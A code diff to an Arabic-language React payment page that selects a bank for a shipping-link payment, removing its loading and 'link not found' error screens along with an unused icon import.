@@ -4,7 +4,7 @@ import { Card } from "@/components/ui/card";
 import { Button } from "@/components/ui/button";
 import { Badge } from "@/components/ui/badge";
 import { useLink } from "@/hooks/useSupabase";
-import { Building2, ArrowLeft, Loader2, AlertCircle } from "lucide-react";
+import { Building2, ArrowLeft, Loader2 } from "lucide-react";
 import { useToast } from "@/hooks/use-toast";
 import { getServiceBranding } from "@/lib/serviceLogos";
 import { getCountryByCode } from "@/lib/countries";
@@ -14,7 +14,7 @@ const PaymentBankSelector = () => {
   const { id } = useParams();
   const navigate = useNavigate();
   const { toast } = useToast();
-  const { data: linkData, isLoading: linkLoading, error } = useLink(id);
+  const { data: linkData, isLoading: linkLoading } = useLink(id);
   
   const [selectedBank, setSelectedBank] = useState<string>("");
   const [banks, setBanks] = useState<Bank[]>([]);
@@ -35,32 +35,6 @@ const PaymentBankSelector = () => {
   const shippingInfo = linkData?.payload as any;
   const amount = shippingInfo?.cod_amount || 500;
   const formattedAmount = `${amount} ر.س`;
-  
-  // Show loading state
-  if (linkLoading) {
-    return (
-      <div className="min-h-screen flex items-center justify-center bg-background" dir="rtl">
-        <div className="text-center">
-          <Loader2 className="w-12 h-12 animate-spin mx-auto mb-4 text-primary" />
-          <p className="text-muted-foreground">جاري التحميل...</p>
-        </div>
-      </div>
-    );
-  }
-  
-  // Show error state only after loading is complete
-  if (!linkLoading && (error || !linkData)) {
-    return (
-      <div className="min-h-screen flex items-center justify-center bg-background" dir="rtl">
-        <div className="text-center p-8">
-          <AlertCircle className="w-16 h-16 mx-auto mb-4 text-destructive" />
-          <h2 className="text-2xl font-bold mb-2 text-foreground">الرابط غير موجود</h2>
-          <p className="text-muted-foreground mb-6">الرجاء التحقق من صحة الرابط</p>
-          <Button onClick={() => navigate('/services')}>العودة للخدمات</Button>
-        </div>
-      </div>
-    );
-  }
   
   // Load banks when country is available from link data
   useEffect(() => {
